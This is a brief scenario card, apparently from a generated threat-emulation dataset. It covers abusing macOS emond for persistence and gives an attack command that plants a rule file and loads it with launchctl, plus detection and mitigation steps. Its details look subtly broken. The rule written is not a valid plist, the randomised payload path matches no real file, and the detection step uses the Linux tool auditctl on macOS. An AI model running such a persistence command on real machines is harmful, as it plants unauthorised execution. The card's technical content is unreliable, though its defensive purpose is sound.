---
type: campaign
scenario_id: 185
tactic: Persistence
technique: "T1546.014: Emond"
technique_id: T1546.014
tags: [campaign, lotl, persistence]
---

# Abusing emond on macOS to execute payload via modified plist.

## Threat Description
Abusing emond on macOS to execute payload via modified plist.

## Attack Command
```
echo 'command=/bin/bash -c "/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh"' > /etc/emond.d/rules/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist && launchctl load /etc/emond.d/rules/*
```

## Detection Logic
Monitor emond plists: `ls /etc/emond.d/rules`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.

## Mitigation
Restrict emond rules: `chmod 700 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.

## AI Training Prompt
Train AI to detect emond plist tampering and suggest access controls.

## References
- MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
